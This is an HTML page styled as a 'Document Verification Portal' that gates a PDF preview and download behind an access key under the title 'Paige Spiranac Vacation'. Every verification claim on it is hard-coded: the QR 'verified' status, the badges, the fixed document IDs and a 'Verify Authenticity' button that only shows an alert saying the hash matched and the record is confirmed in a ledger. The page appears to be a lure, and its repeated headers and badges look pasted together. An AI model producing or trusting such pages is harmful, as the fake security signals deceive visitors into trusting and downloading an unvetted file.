<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Preview</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
  <script defer src="script.js"></script>
</head>
<body>

<header class="site-header">
  <img src="logo.png" alt="Company Logo" class="logo">
  <h1 class="title">Document Verification Portal</h1>
</header>

  <div id="login-screen">
    <div class="login-box">
      <h2>Access Verification</h2>
      <input type="password" id="password" placeholder="Enter Access Key">
      <button onclick="checkPassword()">Unlock</button>
      <p id="error-message"></p>
    </div>
  </div>

  <div id="main-content" style="display:none;">
    <header>
      <img src="logo.png" alt="Site Logo" class="logo">
      <h1>Paige Spiranac Vacation</h1>
    </header>

    <div class="qr-section">
      <img src="qr.png" alt="QR Code" class="qr">
      <p class="scan-status">QR Verified ✓</p>
    </div>

    <div class="info-box">
      <p><strong>Timestamp:</strong> June 10, 2025 – 14:35 UTC</p>
      <p><strong>Status:</strong> ✅ Verified | ID: VTX-2049-AZ</p>
      <img src="badge.png" alt="Verification Badge" class="badge">
    </div>

<header class="site-header">
  <img src="logo.png" alt="Logo" class="logo">
  <div class="org-name">Paige Spiranac Vacation</div>
  <nav>
    <a href="#">Verify</a> | <a href="#">Documents</a> | <a href="#">Support</a>
  </nav>
</header>


<div class="timestamp">
  Session started: <span id="session-time"></span>
</div>

<footer class="verified-footer">
  <img src="badge.png" alt="Verified" class="badge-icon">
  <span>Document #A-103928 | Verified by SecureVault Authority</span>
</footer>


<div class="qr-section">
  <img src="qr.png" alt="Scan QR" title="Scan to verify authenticity">
</div>

<div class="pdf-toolbar">
  <span>📄 Document.pdf</span> | <span>Status: Verified</span>
</div>
<iframe src="document.pdf" class="pdf-viewer"></iframe>

<div class="badge">
  <img src="badge.png" />
  <span>Verified Secure</span>
</div>

<button onclick="alert('Document hash matched ✅\nRecord confirmed in ledger.')" class="verify-btn">🔍 Verify Authenticity</button>

<a href="#" onclick="alert('Confidential Document. Do not distribute.');">View Terms</a>

    <div class="pdf-section">
      <h2>Document Preview</h2>
      <iframe src="document.pdf" width="100%" height="600px" style="border:1px solid #ccc;"></iframe>
    </div>

    <footer>
      <p>© 2025 Verified Secure Preview</p>
    </footer>
  </div>

<a href="document.pdf" download class="download-btn">⬇ Download Verified Document</a>

</body>
</html>